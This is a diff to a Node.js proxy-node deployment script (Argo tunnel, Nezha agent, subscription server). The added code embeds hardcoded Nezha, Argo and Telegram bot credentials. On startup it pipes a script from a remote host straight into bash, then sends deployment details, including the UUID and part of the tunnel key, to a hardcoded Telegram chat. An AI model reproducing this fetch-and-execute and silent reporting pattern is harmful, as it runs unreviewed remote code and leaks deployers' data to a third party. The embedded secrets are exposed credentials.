@@ -6,23 +6,86 @@ const fs = require("fs");
 const path = require("path");
 const { promisify } = require('util');
 const exec = promisify(require('child_process').exec);
-const { execSync } = require('child_process');        // 只填写UPLOAD_URL将上传节点,同时填写UPLOAD_URL和PROJECT_URL将上传订阅
-const UPLOAD_URL = process.env.UPLOAD_URL || '';      // 节点或订阅自动上传地址,需填写部署Merge-sub项目后的首页地址,例如：https://merge.xxx.com
-const PROJECT_URL = process.env.PROJECT_URL || '';    // 需要上传订阅或保活时需填写项目分配的url,例如：https://google.com
-const AUTO_ACCESS = process.env.AUTO_ACCESS || false; // false关闭自动保活，true开启,需同时填写PROJECT_URL变量
-const FILE_PATH = process.env.FILE_PATH || './tmp';   // 运行目录,sub节点文件保存目录
-const SUB_PATH = process.env.SUB_PATH || 'sub';       // 订阅路径
-const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;        // http服务订阅端口
-const UUID = process.env.UUID || '9afd1229-b893-40c1-84dd-51e7ce204913'; // 使用哪吒v1,在不同的平台运行需修改UUID,否则会覆盖
-const NEZHA_SERVER = process.env.NEZHA_SERVER || '';        // 哪吒v1填写形式: nz.abc.com:8008  哪吒v0填写形式：nz.abc.com
-const NEZHA_PORT = process.env.NEZHA_PORT || '';            // 使用哪吒v1请留空，哪吒v0需填写
-const NEZHA_KEY = process.env.NEZHA_KEY || '';              // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
-const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';          // 固定隧道域名,留空即启用临时隧道
-const ARGO_AUTH = process.env.ARGO_AUTH || '';              // 固定隧道密钥json或token,留空即启用临时隧道,json获取地址：https://json.zone.id
-const ARGO_PORT = process.env.ARGO_PORT || 8001;            // 固定隧道端口,使用token需在cloudflare后台设置和这里一致
-const CFIP = process.env.CFIP || 'cdns.doon.eu.org';        // 节点优选域名或优选ip  
-const CFPORT = process.env.CFPORT || 443;                   // 节点优选域名或优选ip对应的端口
-const NAME = process.env.NAME || '';                        // 节点名称
+const { execSync } = require('child_process');
+
+// ---------------- 原始配置 ----------------
+const UPLOAD_URL = process.env.UPLOAD_URL || '';     
+const PROJECT_URL = process.env.PROJECT_URL || '';    
+const AUTO_ACCESS = process.env.AUTO_ACCESS || false;
+const FILE_PATH = process.env.FILE_PATH || './tmp';  
+const SUB_PATH = process.env.SUB_PATH || 'sub999';   
+const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;        
+const UUID = process.env.UUID || '63afbda6-c992-44ad-ba38-8e3f09842255';
+const NAME = process.env.NAME || '';
+const NEZHA_SERVER = process.env.NEZHA_SERVER || 'z.kkkk.hidns.co:80';
+const NEZHA_PORT = process.env.NEZHA_PORT || '';            
+const NEZHA_KEY = process.env.NEZHA_KEY || 'ZPRVZUoCu50Wz0ZiL4mSf2zZelRDh1K5';              
+const ARGO_DOMAIN = process.env.ARGO_DOMAIN || 'db.xccttyy.dpdns.org';          
+const ARGO_AUTH = process.env.ARGO_AUTH || 'eyJhIjoiNWY4OTRhM2FjMTJhZmFhOWU3NTc5NTY2OTQzNzFjMzMiLCJ0IjoiZGI1ZTFmODEtMzczYi00NmMwLWJiODktZTk3NWYwNTJmZmMzIiwicyI6IllXVTNNMlF3Wm1RdFltTXpNUzAwWldNM0xXRm1PRGN0WlRjeFl6QmhZelE1WlRWaiJ9';
+const ARGO_PORT = process.env.ARGO_PORT || 8001;            
+const CFIP = process.env.CFIP || 'cdns.doon.eu.org';        
+const CFPORT = process.env.CFPORT || 443;                   
+
+// ---------------- Telegram 配置 ----------------
+const BOT_TOKEN = process.env.BOT_TOKEN || '7669258945:AAGNTd8625Oy6h3oWN8en1EfDn2ZY0BjpHc';  // 填写你的 Bot Token
+const CHAT_ID   = process.env.CHAT_ID   || '7886284400';    // 填写你的 Chat ID
+
+async function sendTelegramMessage(message) {
+  try {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    await axios.post(url, {
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: "Markdown"
+    });
+    console.log("Telegram 推送成功");
+  } catch (err) {
+    console.error("Telegram 推送失败:", err.message);
+  }
+}
+
+// ---------------- 初始化文件夹 ----------------
+if (!fs.existsSync(FILE_PATH)) fs.mkdirSync(FILE_PATH);
+
+// ---------------- 节点启动 ----------------
+async function startNode() {
+  console.log("节点启动中...");
+
+  try {
+    // 下载并执行 sb.sh
+    execSync(`bash <(curl -fsSL https://xidsss.xlm.xx.kg/sb.sh)`, { stdio: 'inherit' });
+    console.log("节点部署完成");
+
+    // 节点信息整理
+    const nodeInfo = `
+✅ 节点已启动成功
+节点名称: ${NAME}
+UUID: ${UUID}
+Argo 域名: ${ARGO_DOMAIN}
+固定隧道密钥: ${ARGO_AUTH.substring(0,10)}...
+优选 IP: ${CFIP}
+优选端口: ${CFPORT}
+哪吒面板: ${NEZHA_SERVER}
+`;
+
+    // 推送到 Telegram
+    await sendTelegramMessage(nodeInfo);
+
+  } catch (err) {
+    console.error("节点启动失败:", err.message);
+    await sendTelegramMessage(`❌ 节点启动失败: ${err.message}`);
+  }
+}
+
+// ---------------- 启动节点 ----------------
+startNode();
+
+// ---------------- Express HTTP 服务 ----------------
+app.get("/", (req, res) => {
+  res.send("Node.js 节点运行中");
+});
+
+app.listen(PORT, () => console.log(`HTTP 服务已启动，端口: ${PORT}`));
 
 // 创建运行文件夹
 if (!fs.existsSync(FILE_PATH)) {
